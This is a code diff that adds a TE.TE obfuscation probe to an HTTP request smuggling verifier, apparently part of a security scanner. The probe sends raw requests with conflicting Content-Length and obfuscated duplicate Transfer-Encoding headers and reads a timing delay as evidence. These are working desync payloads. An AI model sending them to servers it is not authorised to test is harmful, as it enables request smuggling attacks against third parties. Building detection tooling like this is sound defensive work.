@@ -12178,6 +12178,53 @@ def verify_generic_http_request_smuggling(
                      f"ratio={max(_ratio_clte, _ratio_tecl):.1f}x over baseline")
                 return res
 
+            # --- TE.TE obfuscation probe ---
+            # Both endpoints support Transfer-Encoding, but an obfuscated value confuses one.
+            # Front-end sees "Transfer-Encoding: chunked" (normal), back-end sees obfuscated
+            # variant and falls back to Content-Length → smuggling occurs.
+            step("probando TE.TE obfuscation (chunked/CHUNKED/xchunked)...")
+            _tete_obf_values = ["chunked, identity", "CHUNKED", "xchunked", "chunked;ext=1"]
+            for _obf_val in _tete_obf_values:
+                _tete_body = "0\r\n\r\n"
+                _tete_cl = len(_tete_body) + 10
+                _tete_req = (
+                    f"POST {endpoint} HTTP/1.1\r\n"
+                    f"Host: {_host}:{_port}\r\n"
+                    f"Content-Length: {_tete_cl}\r\n"
+                    f"Transfer-Encoding: chunked\r\n"
+                    f"Transfer-Encoding: {_obf_val}\r\n"
+                    f"\r\n"
+                    + _tete_body
+                )
+                try:
+                    _s_tete = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                    _s_tete.settimeout(10)
+                    _s_tete.connect((_host, _port))
+                    _s_tete.send(_tete_req.encode())
+                    _t0_tete = _t.time()
+                    try:
+                        _s_tete.recv(4096)
+                    except _sock.timeout:
+                        pass
+                    _tete_ms = (_t.time() - _t0_tete) * 1000
+                    _s_tete.close()
+                    _ratio_tete = _tete_ms / max(_baseline_ms, 100)
+                    if _ratio_tete >= 8.0:
+                        res.verified = True
+                        res.ok = True
+                        res.evidence.update({
+                            "smuggling_type": f"TE.TE-obfuscation",
+                            "obfuscated_value": _obf_val,
+                            "baseline_ms": round(_baseline_ms, 1),
+                            "tete_delay_ms": round(_tete_ms, 1),
+                            "ratio": round(_ratio_tete, 1),
+                        })
+                        step(f"VERIFICADO — HTTP Request Smuggling (TE.TE obfuscation={_obf_val!r}): "
+                             f"ratio={_ratio_tete:.1f}x")
+                        return res
+                except Exception as _te_e:
+                    step(f"  TE.TE probe error ({_obf_val!r}): {_te_e}")
+
             # --- Differential response probe (CL.TE variant) ---
             # Poison the backend pipe with a partial request prefix, then send a normal request.
             # If the second response body starts with the smuggled prefix → confirmed.
